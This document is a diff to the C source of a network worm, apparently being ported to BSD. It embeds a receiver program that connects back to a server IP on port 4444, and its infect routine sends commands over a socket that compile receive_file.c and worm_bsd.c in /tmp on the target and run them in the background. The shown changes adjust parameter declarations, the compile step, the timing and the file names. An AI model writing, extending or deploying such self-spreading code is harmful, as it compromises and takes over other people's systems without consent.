@@ -66,9 +66,9 @@ void deploy_receive_file(sock, my_ip)
     file_contents = "#include <stdio.h>\n#include <sys/types.h>\n\
 #include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n\
 #define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\
-int send_int(n,f){unsigned long c=htonl((unsigned long)n);char *d=(char*)&c;\
+int send_int(n,f) int n; int f; {unsigned long c=htonl((unsigned long)n);char *d=(char*)&c;\
 int l=sizeof(c);int r;do{r=write(f,d,l);if(r<0)return -1;else{d+=r;l-=r;}}\
-while(l>0);return 0;} int receive_int(n,f){unsigned long r;char *d=(char*)&r;\
+while(l>0);return 0;} int receive_int(n,f) int *n; int f; {unsigned long r;char *d=(char*)&r;\
 int l=sizeof(r);int rc;do{rc=read(f,d,l);if(rc<=0)return -1;else{d+=rc;l-=rc;}}\
 while(l>0);*n=ntohl(r);return 0;} int main(){int i,j,n,s,fs,len,nf;\
 struct timeval tv;struct sockaddr_in sa;char b[2048],p[256];FILE *o;char *fn;\
@@ -142,22 +142,22 @@ void infect(ip, my_ip)
     }
 
     printf("[*] Attempting to compile receive_file.c on target\n");
-    write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
+    write_to_sock(sock, "cd /tmp; cc receive_file.c -o receive_file\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Running receive_file on target\n");
     write_to_sock(sock, "/tmp/receive_file &\n");
-    sleep(2);
+    sleep(12);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
-    printf("[*] Compiling worm.c on target\n");
-    write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
+    printf("[*] Compiling worm_bsd.c on target\n");
+    write_to_sock(sock, "cc /tmp/worm_bsd.c -o /tmp/worm_bsd\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
-    printf("[*] Running worm.c on target\n");
-    write_to_sock(sock, "/tmp/worm &\n");
+    printf("[*] Running worm_bsd on target\n");
+    write_to_sock(sock, "/tmp/worm_bsd &\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
